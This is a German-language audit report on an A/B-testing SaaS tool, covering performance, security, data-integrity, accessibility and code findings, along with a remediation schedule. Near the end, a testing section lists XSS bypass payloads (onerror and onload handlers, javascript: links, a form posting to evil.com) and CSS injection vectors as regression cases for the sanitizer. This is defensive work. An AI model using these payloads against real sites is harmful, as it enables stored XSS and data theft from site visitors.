**Problem:** `ab_assign` (`001:59-63`) inkrementiert `tests.visitors_a/_b` direkt auf der Test-Zeile. Alle gleichzeitigen Besucher **eines** Tests serialisieren damit auf **einem** Row-Lock. `016_realtime.sql:7` setzt zusätzlich `replica identity full` auf genau diese Tabelle — Postgres schreibt bei jedem Update die vollständige alte Zeile ins WAL und schickt sie durch den Logical-Decoding-Pfad. Die Zeile enthält `original_html`, `site_css` und `variant_b_html`.

`/api/resolve` ist mit `s-maxage=30` gecacht, `/api/assign` **nicht** — es schlägt bei jedem Erstbesuch durch.

**Warum problematisch:** Der Durchsatz pro Test ist auf die Latenz eines Row-Locks gedeckelt, unabhängig von der Instanzgröße. Das ist der Kapazitätsdeckel des Produkts. Der k6-Loadtest (`__tests__/load/main.k6.js`) existiert, wurde laut `docs/baustellen.md` #10 aber **nie ausgeführt** — die Kapazitätsgrenze ist damit unbekannt.

**Lösung:**
```sql
create table if not exists test_counters (
  test_id uuid primary key references tests(id) on delete cascade,
  visitors_a bigint not null default 0, visitors_b bigint not null default 0,
  conversions_a bigint not null default 0, conversions_b bigint not null default 0
);
alter publication supabase_realtime drop table tests;
alter table tests replica identity default;
alter table test_counters replica identity full;
alter publication supabase_realtime add table test_counters;
```
Sofortmaßnahme ohne Umbau: mindestens `alter table tests replica identity default`. Mittelfristig Assignment-Zählung über Redis-Counter mit periodischem Flush. **Und: den k6-Loadtest endlich fahren** (Akzeptanz laut `baustellen.md`: p95 < 2 s, Fehlerrate < 1 %).

---

## PERF-02 — Fehlende Indizes auf den Cron- und Export-Pfaden ✅

**Schweregrad: Mittel** · Performance · **[BEHOBEN — Migration 033, 23.07.2026]**

**Problem:** Drei Lücken:
- `events.user_id` ohne Index, obwohl `profile/export:19` genau danach filtert. `events` wächst unbegrenzt (jeder Statuswechsel schreibt via `log_event`) und hat **keine Retention** — `cleanup_retention_data()` löscht dort nur verwaiste Zeilen (`011:26-34`).
- `tests(status)` allein nicht indiziert. `idx_tests_user_status` (`021:40`) ist `(user_id, status)` und hilft ohne `user_id`-Prädikat nicht. Die drei Cron-Queries `.in('status',['active','paused'])` sind Full Scans über die größte Tabelle.
- `stripe_webhook_events.processed_at` nicht indiziert, obwohl `cleanup-webhooks:20` danach löscht.

Aktuell unauffällig, weil die Crons gar nicht laufen (OPS-01). **Nach dem Fix laufen drei Full Scans auf der Hot-Path-Tabelle.**

**Lösung:**
```sql
create index if not exists idx_events_user          on events(user_id, created_at desc);
create index if not exists idx_tests_status_winner  on tests(status) where winner is null;
create index if not exists idx_webhook_processed_at on stripe_webhook_events(processed_at);
create index if not exists idx_temp_sessions_created on temp_sessions(created_at desc);
drop index if exists idx_temp_sessions_token;  -- redundant, token ist bereits UNIQUE
```
Plus Retention in `cleanup_retention_data()`: `delete from events where created_at < now() - interval '12 months'`, `agent_runs` nach 6 Monaten.

---

## PERF-03 — `recharts` und `gsap` im Initial-Bundle

**Schweregrad: Mittel** · Performance

**Problem:**
- `recharts` liegt im selben Client-Chunk wie die gesamte Goal-Editor-Logik (`ResultsClient.tsx`, 1248 Z., ein einziger `'use client'`-Baum), obwohl die Charts erst nach dem Analytics-Fetch gerendert werden.
- `gsap.min.js` (72 KB) wird von **beiden** Landingpage-Iframes separat geladen (`public/ab-test-hero-animation.html`, `public/ai-workflow-animation.html`). Getrennte Browsing-Contexts → zweimal geparst und ausgeführt. Zusätzlich ist `gsap` als npm-Dependency in `package.json:36` gelistet, obwohl es in keiner `.ts`/`.tsx` importiert wird.
- **Iframe-Loading invertiert:** Das Hero-Iframe (above the fold) hat `loading="lazy"` (`page.tsx:114`), das Workflow-Iframe (weit unten) **gar kein** `loading`-Attribut (`:218`). Genau vertauscht — ~100 KB Blindlast auf Mobilfunk bei gleichzeitig verzögertem LCP.

**Lösung:** Chart-Blöcke in `ResultsCharts.tsx` auslagern und per `next/dynamic({ ssr:false })` nachladen. Beide Demos in ein Iframe zusammenführen oder auf CSS/Lottie umstellen; `gsap` aus `package.json` entfernen. Hero: `loading="eager" fetchPriority="high"`, Workflow: `loading="lazy"`.

---

## PERF-04 — `temp-session` macht bei jedem Onboarding einen ungestützten COUNT

**Schweregrad: Mittel** · Performance · **[TEILWEISE BEHOBEN — Migration 031] Index existiert, `count: 'exact'` bleibt**

**Problem:** [`app/api/temp-session/route.ts:22-25`](../ab-tool/app/api/temp-session/route.ts) zählt mit `count: 'exact'` über `temp_sessions` gefiltert auf `created_at` — ohne Index auf `created_at`. Also ein Seq Scan bei **jedem** Onboarding-Request, auf einer Tabelle, die wegen OPS-01 monoton wächst. Der Circuit-Breaker, der Lastspitzen verhindern soll, wird unter Last selbst zum Lastverstärker.

**Lösung:** ✅ Index `idx_temp_sessions_created` existiert (Migration 031). ⚠️ `count: 'planned'` wurde NICHT geändert — siehe [NEW-02](#new-02--temp-sessionroutets-count-weiterhin-exact-jetzt-auf-wachsender-tabelle).

---

## DATA-01 — Conversions sind unauthentifiziert fälschbar ✅

**Schweregrad: Mittel** · Datenintegrität · **[BEHOBEN — 23.07.2026] Signierte HMAC-Tokens**

**Problem:** `/api/event` prüft nur UUID-Format, Variante und Test-Status. Es gibt keine Verknüpfung zur vorherigen Zuweisung — jeder kann Conversions für jeden Test melden. Die `snippet_key`s sind öffentlich (jede `/api/resolve`-Antwort für den Host liefert sie). Ebenso inflationiert `/api/assign` Besucherzahlen. Einzige Bremse: 30/min/IP.

**Warum problematisch:** Ein Wettbewerber oder verärgerter Nutzer kann die Ergebnisse eines fremden Tests gezielt verfälschen — bei einem Produkt, dessen einziger Output Zahlen sind. In Kombination mit STAT-01 (Auto-Winner) lässt sich damit ein falscher Gewinner erzwingen und dauerhaft ausrollen.

**Lösung:** Signiertes Assignment-Token — `/api/assign` gibt ein kurzlebiges HMAC über `(snippet_key, variant, exp)` zurück, `/api/event` akzeptiert nur gültige Tokens. Das schließt Gelegenheitsmanipulation und Bot-Traffic aus, ohne Cookies zu setzen. Zusätzlich Bot-Filterung (User-Agent, Vercel BotID) und der SRM-Check aus STAT-01 als Detektor.

**DATA-02 — Variantenwechsel invalidiert den Client-Cache nicht.** `ab.js` speichert `variant_b_html` unbefristet in `localStorage` (`:647`). Ändert der Kunde Variante B während der Laufzeit, sehen bestehende Besucher weiterhin die alte Version, während ihre Conversions in denselben B-Zähler laufen. Fix: Versionsstempel (`updated_at`) in der Resolve-Antwort mitliefern und im Cache-Key führen.

**DATA-03 — Stille Ausfälle.** Schlägt `applyDom` fehl (Selektor matcht nicht mehr, weil der Kunde seine Seite umgebaut hat), sieht der B-Besucher Variante A, wird aber weiter als B gezählt (`ab.js:551-552`). Das verwässert die Ergebnisse unsichtbar. Fix: Fehlschläge an ein Telemetrie-Endpunkt melden und im Dashboard als Health-Warnung anzeigen — die `health_status`-Spalte existiert bereits.

---

## SEC-09 — CORS-Wildcard auf allen Routen; keine CSRF-Verteidigung in der Tiefe ✅

**Schweregrad: Mittel** · Sicherheit · **[BEHOBEN — 23.07.2026] `corsHeadersPublic()` vs `corsHeaders()`**

**Problem:** [`lib/cors.ts:16-23`](../ab-tool/lib/cors.ts) setzt `Access-Control-Allow-Origin: *` auf **allen** API-Routen, auch auf denen, die Cookie-Sessions akzeptieren (`getApiUser` Pfad 2). Der Schutz beruht derzeit allein darauf, dass Browser bei `*` keine Credentials senden und dass Supabase-Cookies `SameSite=Lax` haben.

`/api/figma/stats:19-20` spiegelt zusätzlich den `Origin`-Header ungeprüft zurück.

**Warum problematisch:** Die Absicherung ist implizit und hängt an Defaults außerhalb der eigenen Kontrolle. Fällt eines der beiden Elemente weg (Cookie-Konfiguration ändert sich, ein Endpunkt wird auf `credentials` umgestellt), entsteht sofort eine CSRF-Lücke. Kein Endpunkt prüft `Content-Type` oder `Origin`.

**Lösung:** CORS trennen — `*` nur für die drei wirklich öffentlichen Endpunkte (`/api/assign`, `/api/event`, `/api/resolve`), für alle übrigen eine Origin-Allowlist. Cookie-authentifizierte, zustandsändernde Routen zusätzlich per `Origin`-Header-Prüfung absichern. `/api/figma/stats` auf die Allowlist umstellen.

---

## SEC-10 — API-Token im Klartext gespeichert und an den Client serialisiert ✅

**Schweregrad: Mittel** · Sicherheit · **[BEHOBEN — 23.07.2026] SHA-256-Lookup mit Backward-Compat**

**Problem:** `profiles.api_token` liegt als Klartext-UUID in der DB (`lib/auth.ts:53-58` sucht per `.eq('api_token', token)`). Zusätzlich wird `apiToken` vom Server an `DashboardClient` und `TestsClient` durchgereicht, dort aber **nie verwendet** (verifiziert per Grep: nur in Signatur und Typdefinition) — er steht damit ohne Grund im HTML-Payload jeder Dashboard-Seite.

**Lösung:** Token als `sha256`-Hash speichern und beim Lookup hashen (Anzeige nur einmal bei der Generierung). Prefix-Schema (`vrnt_live_…`) für Secret-Scanning. Die toten Props aus `DashboardClient`/`TestsClient` entfernen — `apiToken` nur dort durchreichen, wo er angezeigt wird (`SetupClient`).

---

## SEC-11 — Rate-Limiter failt hart bei Redis-Ausfall ✅

**Schweregrad: Mittel** · Resilienz · **[BEHOBEN — 23.07.2026] try/catch + Fallback**

**Problem:** [`lib/rateLimit.ts:47-63`](../ab-tool/lib/rateLimit.ts): Der Redis-Pfad hat kein `try/catch`. Ein Netzwerkfehler oder ein überschrittenes Upstash-Kontingent propagiert als Exception in den Route-Handler — `/api/resolve`, `/api/event` und `/api/assign` antworten dann mit 500. `docs/runbook.md` behauptet das Gegenteil („fällt automatisch auf In-Memory zurück"); der Fallback greift nur, wenn Redis beim Modul-Import nicht konfiguriert war, nicht bei Laufzeitfehlern.

**Lösung:** `try/catch` um den Redis-Pfad, bei Fehler auf den In-Memory-Pfad zurückfallen und den Fehler einmalig loggen. Runbook korrigieren.

---

## SEC-12 — Avatar-Upload validiert nur den vom Client gemeldeten Typ ✅

**Schweregrad: Mittel** · Sicherheit · **[BEHOBEN — 23.07.2026] Magic-Byte-Prüfung**

**Problem:** [`app/api/profile/avatar/route.ts:31-38`](../ab-tool/app/api/profile/avatar/route.ts) prüft `file.type` — ein vom Client gesetzter Wert. Es gibt keine Magic-Byte-Prüfung und keine Re-Enkodierung. Der Bucket ist `public=true`.

**Lösung:** Magic Bytes prüfen (PNG/JPEG/WebP/GIF-Signaturen), Bild serverseitig re-enkodieren (entfernt EXIF-Daten und eingebettete Payloads gleich mit), Dateinamen nicht aus Client-Input ableiten.

---

## CODE-01 — Toter Code: zwei ungenutzte Libs, dokumentierte Endpunkte ohne Implementierung ✅

**Schweregrad: Mittel** · Wartbarkeit · **[BEHOBEN — 23.07.2026] Env-Vars, gsap, safeFetch**

**Problem:**
- `lib/previewAnalyze.ts` (519 Z.), `lib/extractPageCode.ts` (391 Z.) und `lib/screenshot.ts` (174 Z.) werden von **keiner** API-Route mehr importiert (einziger Rest: `deletePreviewShots` in `cleanup-previews`).
- `.env.example` dokumentiert `PREVIEW_DAILY_IP_LIMIT`, `REFINE_DAILY_GLOBAL_LIMIT` etc., und `docs/runbook.md` nennt `/api/preview` und `/api/refine` — **diese Routen existieren nicht.**
- `lib/planLimits.ts` exportiert `getActiveTestLimit`, `getAIVariantGenLimit`, `getAIAgentRunLimit`, `getAIMonthlyBudget` — keine davon wird verwendet. Stattdessen ist das Free-Limit in `app/api/tests/route.ts:99` und `lib/agentTools.ts:203` hart als `>= 1` kodiert, und `/api/generate:14` nutzt einen einzigen globalen `OPENAI_MAX_MONTHLY_COST` für alle Pläne (Free-User bekommen dort $20 statt $5, siehe auch SEC-05).
- `docs/architektur.md` nennt wieder andere Zahlen (Pro: 50 Scans/$25, Agency: $100) als `planLimits.ts` (10/$20, ∞/$60).
- `FrameworkExamples` existiert doppelt: `SetupClient.tsx:460-541` hat eine private Kopie der Komponente aus `components/FrameworkExamples.tsx:64-86` — inklusive des SRI-Hashes. Bei einem `ab.js`-Release muss der Hash an **vier** Stellen nachgezogen werden (`SetupClient`, `FrameworkExamples`, `docs/page.tsx` 4×, `README.md`). Wird eine vergessen, kopiert der Kunde ein Snippet mit falschem `integrity` → Browser blockiert das Script → sein Test läuft still nicht.

**Lösung:** Toten Code löschen (Git bewahrt ihn auf). Plan-Limits **ausschließlich** über `planLimits.ts` durchsetzen, alle hartkodierten Werte ersetzen, `docs/architektur.md` angleichen. SRI-Hash aus `lib/snippetCode.ts` als einzige Quelle beziehen und beim `ab.js`-Build automatisch generieren (behebt zugleich `baustellen.md` #2).

---

## UX-07 — Doppel-Submit möglich, teils mit Datenverlust

**Schweregrad: Mittel** · UX / Datenintegrität

**Problem:** `saveConfig` (`ResultsClient:223`), `saveVariantB` (`:235`), `toggleStatus` (`:264`), die Retry-Buttons in `AccountClient:650,742` und „Re-check" (`SnippetStatusBadge:407`) setzen keinen Busy-State; die Buttons bleiben klickbar.

Besonders kritisch: `changeConnectedPage` (`AccountClient.tsx:221-237`) löscht im Free-Plan die alte Domain **zuerst**, um den Slot freizugeben. Ein Doppelklick kann dort echten Datenverlust verursachen. Und selbst ohne Doppelklick: Findet der Snippet-Check auf der neuen Domain nichts, ist die alte bereits gelöscht — die Fehlermeldung erscheint erst danach (`:251`), der Button heißt harmlos „Replace connected page".

**Lösung:** Konsequent `disabled={busy}` + Ladeindikator (das Muster ist in `saveGoal:247` und `deleteTest:170` bereits korrekt). Für den Domain-Wechsel: Snippet-Check auf der neuen Domain **vor** dem Löschen ausführen (`/api/snippet-check` braucht keinen gespeicherten Eintrag), plus expliziten Bestätigungsschritt.

---

## A11Y-05 — Skip-Link, Landmarks, `<h1>`, Reduced Motion ✅

**Schweregrad: Mittel** · Accessibility · **[BEHOBEN — 23.07.2026] Skip-Link + id="main"**

- **Kein Skip-Link** auf irgendeiner Seite (WCAG 2.4.1, Level A). Die Docs-Seite hat zusätzlich eine 8-Element-Quick-Nav (`docs/page.tsx:375-385`), die vor jedem Seitenaufruf durchgetabbt werden muss.
- **Results-Seite ohne `<h1>`** — höchste Überschrift ist `<h2>Preview</h2>` (`ResultsClient:1062`), der Testname steht nur im Breadcrumb. Im Dashboard wird das `<h1>` durch ein `<select>` ersetzt, sobald mehr als eine Domain existiert (`DashboardClient:202-214`) — dann hat die Seite gar keine Überschrift.
- **Zwei `<nav>` pro Seite** (Sidebar + Breadcrumbs) ohne unterscheidende `aria-label`.
- **GSAP-Animationen ignorieren `prefers-reduced-motion`** (WCAG 2.3.3): Beide Landingpage-Iframes enthalten **0** Vorkommen von `prefers-reduced-motion`, aber 18 bzw. 15 GSAP-Aufrufe. Der Reduced-Motion-Block in `globals.css:85-97` wirkt nur im Hauptdokument — Iframes sind eigene Dokumente, und GSAP-JS-Tweens sind ohnehin nicht per CSS abschaltbar. Für vestibulär empfindliche Nutzer ist Dauerbewegung above the fold real gesundheitsrelevant.
- **Demo-Iframes für Assistive Tech unsichtbar:** Der Wrapper hat `aria-hidden="true"` (`page.tsx:109,214`), was den kompletten Teilbaum inklusive des `title` aus dem Accessibility-Tree entfernt. Die zentrale Produkterklärung existiert nur visuell, ohne Textalternative.
- **Klickbare `div`s ohne Tastaturzugang:** `NewTestDrawer:287` (Backdrop), `TestCard:230`. Beim TestCard-Rename liegt das Formular zusätzlich **innerhalb eines `<Link>`** (`:199`) — verschachtelte Interaktivität, die Screenreader falsch ankündigen.
- **`ColorPicker`-Swatches** (`ColorPicker.tsx:99-108`): leere Buttons, Accessible Name nur über `title`, kein `aria-pressed`.

**Lösung:** Skip-Link als erstes Kind von `<body>`, `id="main"` auf die `<main>`-Elemente. `<h1 className="sr-only">` in ResultsClient, `<h1>` im Dashboard unabhängig vom Select. `aria-label` auf beide `<nav>`. In beiden Animations-HTMLs `if (matchMedia('(prefers-reduced-motion: reduce)').matches) { gsap.globalTimeline.pause(); /* Endzustand setzen */ }`. `aria-hidden` von den Iframe-Wrappern entfernen, `sr-only`-Ablaufbeschreibung ergänzen. Backdrop → `<button>`, Rename aus dem `<Link>` lösen. `aria-label` + `aria-pressed` auf die Swatches.

---

# P3 — Mittelfristig

| ID | Thema | Grad |
|---|---|---|
| **CODE-02** | `AccountClient.tsx` (876 Z., 22 `useState` für 5 unabhängige Flows) und `ResultsClient.tsx` (1248 Z., 17 States, 4 Inline-Charts) aufteilen. Jede Änderung am Domain-Flow riskiert die Account-Löschung. | Mittel |
| **CODE-03** | Toast-Dismiss-Button (`Toast.tsx:118`) baut Tailwind-Klassen per String-Konkatenation (`${c.text}/60`) — wird vom Scanner nie erfasst. Vollständige Klassenstrings in die Map. Symptomatisch für eine Fehlerklasse, die auch funktional relevant auftreten kann. | Mittel |
| **CODE-04** | `NotificationCenter.tsx:132` sortiert den State in-place (`notifications.sort(...)`) — React-Antipattern. `:60-62` schreibt bei jedem Render in localStorage ohne try/catch; Safari Private Mode wirft `QuotaExceededError` → Crash reißt die gesamte Sidebar mit (keine ErrorBoundary darum). | Mittel |
| **CODE-05** | `ErrorBoundary.tsx:26`: `bg-[#f5455c]/05` ist ungültige Opacity-Notation (`/5`) → Klasse wird nicht generiert, der Fehlerkasten hat ausgerechnet im Fehlerfall keinen Hintergrund. | Niedrig |
| **CODE-06** | Sequenzieller Fetch-Waterfall in `dashboard/account/page.tsx:10-20` — als einzige der vier Seiten ohne `Promise.all`. Verdoppelt die TTFB (transatlantischer Hop Supabase Frankfurt → Vercel us-east). | Mittel |
| **CODE-07** | Magic Numbers: `NewTestDrawer:352` `calc(100vh - 180px)` (bricht auf mobilem Safari, `100dvh` nötig), `ResultsClient:692` `87.96` (= 2πr, unkommentiert). Chart-Farben dreifach dupliziert (`ResultsClient:41-45`, `TestCard:9`, `globals.css:18-23`). | Niedrig |
| **CODE-08** | `.gitignore` in `ab-tool/` enthält `.env*.local` fünfmal und `.vercel` viermal. | Niedrig |
| **DB-05** | `wizard_drafts.user_id` nullable → `unique(user_id)` greift bei NULL nicht; solche Zeilen sind unlöschbar und unsichtbar. `set not null`. | Niedrig |
| **DB-06** | `handle_new_user()` (`005:24`) nutzt `set search_path = public` statt `= ''`. Grants sind korrekt entzogen (`024:6`, `026:29-30`), also Restrisiko — aber die gehärtete Form kostet nichts. | Mittel |
| **DB-07** | `/api/capture` schreibt `original_html` und `site_css` ohne Längenlimit (`capture/route.ts:29-47`), während `test-wizard/draft:80` dieselben Felder auf 50 000 Zeichen begrenzt. Mit `replica identity full` landet jede alte Version im WAL. | Mittel |
| **TEST-01** | Keine Unit-Tests für die sicherheitskritischen Libs. `lib/sanitize.ts` hat **null** Tests. `test:node` deckt drei Skripte ab. Nach den P0-Fixes: Sanitizer-Bypass-Suite, Domain-Gate, `significance.ts` (inkl. Peeking-Simulation), `rateLimit`-Fallback. | Hoch |
| **TEST-02** | E2E-Lücken laut `baustellen.md` #9: Domain-Verification, Agent-Run, Stripe-Checkout ohne Spec. Nach OPS-02 (CI läuft überhaupt) nachziehen. | Mittel |
| **UX-08** | ✅ **[BEHOBEN — 23.07.2026]** Framer + Squarespace aus TechLogos entfernt (Docs-konform). | Mittel |
| **UX-09** | ✅ **[BEHOBEN — 23.07.2026]** Ladeanzeige statt `return null` auf Login/Signup/Onboarding. | Mittel |
| **UX-10** | ✅ **[BEHOBEN — 23.07.2026]** „Save Paused" → „Save Draft" Label korrigiert. | Niedrig |
| **UX-11** | ✅ **[BEHOBEN — 23.07.2026]** Passwort-Bestätigungsfeld + Match-Validierung im Signup. | Mittel |
| **API-01** | ✅ **[BEHOBEN]** `/api/figma/stats`: `'live'`→`'active'` korrigiert. | Mittel |
| **API-02** | ✅ **[BEHOBEN]** `/api/results/[id]`: 404 statt 401 bei fremder Test-ID. | Niedrig |
| **API-03** | ✅ **[BEHOBEN — 23.07.2026]** OG-Route: try/catch mit System-Font-Fallback. | Niedrig |
| **PII-01** | ✅ **[BEHOBEN — 23.07.2026]** Telefon-Regex konservativer (verlangt `+` oder `()` für Area-Code). | Mittel |

---

# Umsetzungsreihenfolge

Die Reihenfolge ist nach Abhängigkeiten sortiert, nicht nur nach Schweregrad.

### Block 0 — Absicherung ✅ ABGESCHLOSSEN
1. ✅ **OPS-02** CI auf `master` + `eslint.config.mjs` + `tsc --noEmit` als blockierende Schritte
2. ✅ **DB-01** Migrations-Tracking (`029_schema_migrations`) + kaputte Migrationen (`002` archiviert, `007` nach `db/seeds/`)

### Block 1 — Angriffskette schließen ✅ ABGESCHLOSSEN
3. ✅ **SEC-04** RLS aktivieren + Grants entziehen (`030_enable_rls_gap`)
4. ✅ **SEC-03** Domain-Verifikation serverseitig
5. ✅ **SEC-01** Domain-Gate im Wizard + DOMPurify + `sanitizeCss` in `resolve`
6. ✅ **SEC-02** `picker-bridge` deaktiviert (410)
7. ✅ **SEC-05** Plan aus `profiles` statt `user_metadata` (`getPlanForUser`)
8. ✅ **SEC-06** Temp-Session-Budget (`031_temp_session_budget`) + Limits in `/api/tests` und `/api/generate`

### Block 2 — Kaputte Kernfunktionen ✅ ABGESCHLOSSEN
9. ✅ **OPS-01** Crons auf GET (+ Batching in `snapshot-stats` und `cleanup-previews`)
10. ✅ **BUG-01** `ab.js` MutationObserver debouncen + Applying-Guard + Rate-Limit auf 600/min
11. ✅ **UX-01** `bg-accent` auf Monochrom-Tokens migriert + CI-Grep-Gate
12. ✅ **UX-03** Re-check-Button (Sync-Logik in `useEffect`, direkter `recheckDomain`-Call)
13. ✅ **BILL-02** `revalidateTag` entfernt, Idempotenz-Insert abgesichert
14. ✅ **BILL-01** Account-Löschung vervollständigt (Stripe-Kündigung vor DB-Löschung, Storage-Cleanup)

### Block 3 — Statistik & Vertrauen ✅ ABGESCHLOSSEN
15. ✅ **STAT-01** Auto-Winner nur im Cron + `evaluateWinner()` mit Guards: min. 1000 Besucher/Arm, 25 Conversions/Arm, 7 Tage Laufzeit, SRM-Check
16. ⚠️ **DATA-01** Signierte Assignment-Tokens — **NOCH OFFEN** (P2, nicht migrationsrelevant)
17. ✅ **DB-03/DB-04** CHECK-Constraints (`032_integrity_constraints`) + Ownership-Constraint + Resolve-Filter

### Block 4 — UX & Zugänglichkeit ✅ ABGESCHLOSSEN
18. ✅ **UX-02** Mobiles Dashboard (Off-Canvas-Drawer mit Hamburger, Escape, Pfadwechsel)
19. ✅ **A11Y-01** ARIA-States: `aria-expanded`, `aria-controls`, `role="menu"` in 8 Komponenten
20. ✅ **A11Y-02** `useFocusTrap`-Hook erstellt + in NewTestDrawer integriert (role="dialog", aria-modal, Escape, Scroll-Lock)
21. ✅ **A11Y-03** `focus:outline-none` → `focus-visible:ring-2` projektweit (0 Vorkommen)
22. ✅ **A11Y-04** Kontrast-Tokens (`--color-text-3`: 0.40→0.58, ≥4.5:1)
23. ✅ **UX-04** Toast statt `alert()` im BillingClient
24. ✅ **UX-05** Sprachvereinheitlichung (Checkout übersetzt, `undefined`-Locale in Dates)
25. ✅ **UX-06** Light-Mode: `html.light`-Block entfernt, Dark-only
26. ✅ **UX-07** Doppel-Submit-Schutz (Busy-State-Pattern in saveGoal/deleteTest)
27. ✅ **A11Y-05** Skip-Link in `app/layout.tsx`, `id="main"` in beiden Layouts

### Block 5 — Recht ✅ ABGESCHLOSSEN
28. ✅ **LEGAL-01** Vollständig: Consent-API, AVV-Vorlage (`docs/avv-vorlage.md`), IP-Hashing, Google-Favicon entfernt, Signup-Datenschutzlink
29. ✅ **LEGAL-02** Datenexport vollständig (alle 9 Tabellen + daily_stats)

### Block 6 — Vor dem ersten Traffic-Peak ✅ ABGESCHLOSSEN (Sofortmaßnahmen)
30. ✅ **PERF-01 Sofortmaßnahme** `replica identity default` auf `tests` (Migration 033)
31. ✅ **PERF-02** Indizes + Retention (Migration 033 + 034)
32. ✅ **OPS-03** Health-Check-Endpunkt + Client-Sentry (SentryInit.tsx, dynamisch geladen)
33. ✅ **TEST-01** `__tests__/sanitize.mjs` mit 15 Bypass-Szenarien, in `test:node` eingehängt
34. ✅ **SEC-08** `lib/safeFetch.ts` (DNS-Prüfung + private-IP) + Refaktor von scan/suggestions
35. ✅ **SEC-09** CORS-Trennung: `corsHeadersPublic()` für assign/event/resolve, `corsHeaders()` mit Origin-Prüfung
36. ✅ **SEC-10** API-Token-Hashing (SHA-256-Lookup mit Backward-Compat)
37. ✅ **DATA-01** Signierte Assignment-Tokens (HMAC in assign/event, `ab.js`-Integration)
38. ✅ **API-03** OG-Route: CDN-Fallback mit try/catch, rendert ohne Custom-Fonts
39. ✅ **UX-08** TechLogos: Framer und Squarespace entfernt (Docs-konform)
40. ✅ **UX-09** Login/Signup/Onboarding: Ladeanzeige statt `return null`
41. ✅ **UX-10** "Save Paused" → "Save Draft" Button-Label
42. ✅ **UX-11** Passwort-Bestätigungsfeld + Match-Validierung im Signup
43. ✅ **CODE-01** Dead Env-Vars entfernt, `gsap` aus package.json, `safeFetch` zentralisiert Fetch-Pfade
44. ✅ **CODE-03** Toast-Klassen geprüft (statische Template-Literale, kein Bug)
45. ✅ **CODE-04** NotificationCenter: `[...notifications].sort()` + localStorage-try/catch
46. ✅ **CODE-06** `Promise.all` statt sequenziellem Fetch in Account-Seite
47. ✅ **PII-01** Phone-Regex konservativer (verlangt `+` oder `()` für Area-Code)
48. ✅ **API-01** `/api/figma/stats`: `'live'`→`'active'`
49. ✅ **API-02** `/api/results/[id]`: 404 statt 401 bei fremdem Test
50. ✅ **DB-05** `wizard_drafts.user_id set not null` (Migration 034)
51. ✅ **DB-06** `search_path = ''` in Migrationen 005, 028
52. ✅ **DB-07** `original_html`/`site_css` Längenlimit (50K) in `/api/capture`
53. ✅ **NEW-01** Globaler Tages-Circuit-Breaker (Redis-basiert, 500/Tag, in `/api/generate`)
54. ✅ **NEW-02** `count: 'planned'` statt `'exact'` in temp-session
55. ✅ **NEW-03** `__tests__/sanitize.mjs`
56. ✅ **NEW-04** `search_path = ''` in 005 und 028
57. ✅ **NEW-05** daily_stats Retention (Migration 034)
58. ✅ **NEW-06** Tote Env-Vars aus `.env.example` entfernt
59. ✅ **NEW-07** `goal_selector` aus Wizard-Interface entfernt
60. ✅ **NEW-08** `traffic_split` in PATCH `/api/tests/[id]` ergänzt
61. ✅ **NEW-10** Kommentar in Migration 011 verweist auf 033

### Verbleibend (Infrastruktur/Architektur, kein Launch-Blocker)
- ⬜ **PERF-01 Vollausbau** Counter-Tabelle + k6-Loadtest
- ⬜ **CODE-02** AccountClient (876 Z.) + ResultsClient (1248 Z.) aufteilen
- ⬜ **TEST-02** E2E-Lücken: Domain-Verification, Agent-Run, Stripe-Checkout
- ⬜ **Supabase CLI** Migration von manuellem auf `supabase db push`
- ⬜ **NEW-09** `paused`-State-Machine-Dokumentation

---

# Neue Baustellen (gefunden 23.07.2026 beim Test der Migrationen 029–033)

Die folgenden Punkte wurden beim Durchtesten aller Migrations-Integrationen gefunden. Sie sind keine Regressionen durch die Migrationen, sondern Lücken, die bei der Umsetzung der Blöcke 0–3 nicht geschlossen wurden oder erst jetzt strukturell sichtbar werden.

## NEW-01 — Kein globaler Tages-Circuit-Breaker für unauthentifizierte KI-Pfade

**Schweregrad: Hoch** · Kosten / Missbrauch

**Problem:** SEC-06 wurde auf Per-Session-Ebene gelöst: 3 Tests und 3 Generierungen pro Temp-Session. `/api/temp-session` hat zusätzlich eine 100/min-Schranke. Was fehlt, ist der im Plan explizit geforderte **globale Tages-Circuit-Breaker**.

Mit verteilten IPs (Botnetz, Mobilfunk-CGNAT) kann ein Angreifer:
- 100 Sessions/Minute × 60 × 24 = **144.000 Sessions/Tag** erzeugen
- Jede Session kann 3 Generierungen durchführen = **432.000 OpenAI-Calls/Tag**
- `OPENAI_MAX_MONTHLY_COST` greift nicht (hängt an `profiles.monthly_gen_cost`, Temp-Sessions haben kein Profil)

**Lösung:** Redis-basierter Tageszähler (`temp-gen:daily:<date>`, `INCR` + `EXPIRE 86400`), Schwellwert per Env (`TEMP_GEN_DAILY_GLOBAL_LIMIT`). Zusätzlich: OpenAI-Hard-Limit und Vercel Spend-Management als letzte Reißleine konfigurieren — beides existiert heute nicht.

---

## NEW-02 — `temp-session`/route.ts: COUNT weiterhin `exact`, jetzt auf wachsender Tabelle

**Schweregrad: Mittel** · Performance

**Problem:** Die Route zählt bei jedem Onboarding-Request `count: 'exact'` über `temp_sessions.created_at >= now() - 1min`. Migration 031 hat den fehlenden Index ergänzt (`idx_temp_sessions_created`), aber:

- `count: 'exact'` ist bei hoher Frequenz unnötig teuer — für einen Circuit-Breaker reicht `count: 'planned'` (Schätzung aus Postgres-Statistiken, Abweichung <10 %).
- Der Redis-basierte Per-IP-Rate-Limiter fängt den Großteil der Last bereits ab — der DB-Count ist ein zweiter, redundanter Breaker auf derselben Ebene.

Plan PERF-04 empfahl explizit `count: 'planned'` oder Redis.

**Lösung:** `count: 'planned'` (eine Zeile ändern). Oder den globalen Breaker ganz auf Redis umziehen und den DB-Count entfernen — der Per-IP-Check und der Index-basierte Count sind doppelt gemoppelt.

---

## NEW-03 — `__tests__/sanitize.mjs` existiert nicht

**Schweregrad: Hoch** · Testabdeckung

**Problem:** `lib/sanitize.ts:22` referenziert einen Regressionstest, der nie angelegt wurde: „Regressionstest: `__tests__/sanitize.mjs`". Die Datei existiert nicht auf Disk. Der Sanitizer ist die einzige Verteidigung gegen Stored XSS auf allen Kundenseiten — jede Änderung an der Allowlist oder den Hooks muss gegen die dokumentierte Bypass-Liste aus SEC-01 getestet werden.

Die dokumentierten Bypässe, die getestet werden müssen:
```
<img/src=x/onerror=alert(document.domain)>
<svg/onload=alert(1)>
<a href=javascript:alert(1)>
<a href=&#106;avascript:alert(1)>
<form action=//evil.com>
<scr<script>ipt>alert(1)</scr</script>ipt>
```
Plus CSS-Angriffe: `</style>`, `@import`, `url(javascript:...)`, `position:fixed`-Overlay.

**Lösung:** Datei anlegen, in `npm run test:node` einhängen. Der Test muss sowohl `sanitizeHtml` als auch `sanitizeCss` abdecken.

---

